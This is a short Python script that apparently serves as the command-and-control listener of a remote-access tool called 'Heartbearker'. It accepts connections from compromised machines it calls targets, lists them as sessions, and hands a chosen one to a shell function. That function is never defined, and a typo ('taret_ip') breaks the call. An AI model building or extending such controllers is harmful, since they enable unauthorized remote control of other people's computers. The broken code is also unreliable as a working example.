#!/usr/bin/python3

import socket
import threading
import json
import os
import base64


# Main server function
def server():
    # Count variable assigning to each bot, incrementing each time a connection is established
    global clients

    while True:
        if stop_threads:
            break
        s.settimeout(1)

        try:
            # Accepting connection
            target, ip = s.accept()

            # Adding info of the newly connected target
            targets.append(target)
            ips.append(ip)
            print(f"{str(targets[clients])}:{str(ips[clients])} Has Connected!")
            
            # Target count incremented
            clients += 1
        except:
            pass

# Socket object
global s
targets = []
ips = []
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

host = ""
port = 1234
s.bind((host, port))
s.listen(5)

# Target start with index (id) 0
clients = 0
stop_threads = False

t = threading.Thread(target=server)
t.start()

# Interactive 
while True:
    # User input command
    command = input("* Heartbearker: ")
    
    # Listing all connected target
    if command == "targets":
        count = 0

        # For loop getting all the ip from the ips list
        for ip in ips:
            print(f"Session {str(count)} <---> {str(ip)}")
            count += 1

    # Choosing a sesstion to interact (metasploit)
    elif command[:7] == "session":
        try:
            num = int(command[8:])
            target_num = targets[num]
            target_ip = ips[num]
            shell(target_num, taret_ip)
        except:
            print("[-] No session under that number!")
